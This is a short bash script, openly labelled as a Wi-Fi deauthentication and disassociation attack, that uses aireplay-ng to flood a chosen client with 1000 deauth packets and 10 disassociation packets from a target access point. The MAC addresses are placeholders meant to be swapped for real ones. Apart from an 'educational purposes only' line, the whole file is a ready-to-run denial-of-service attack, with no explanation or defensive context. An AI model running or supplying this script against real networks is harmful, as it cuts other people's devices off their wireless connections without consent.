#!/bin/bash

# ⚠️ WiFi Deauth & Disassoc Attack Script using aireplay-ng
# 📌 Educational purposes only

# ✅ Replace these with actual values before running
BSSID="AA:BB:CC:DD:EE:FF"      # Target access point MAC
CLIENT_MAC="11:22:33:44:55:66" # Victim/client device MAC
INTERFACE="wlan1mon"           # Your monitor mode interface

echo "[*] Sending 1000 deauth packets to client $CLIENT_MAC from AP $BSSID..."
sudo aireplay-ng --deauth 1000 -a $BSSID -c $CLIENT_MAC $INTERFACE

echo "[*] Sending 10 disassociation packets..."
sudo aireplay-ng --disassoc 10 -a $BSSID -c $CLIENT_MAC $INTERFACE

echo "[✓] Attack completed."
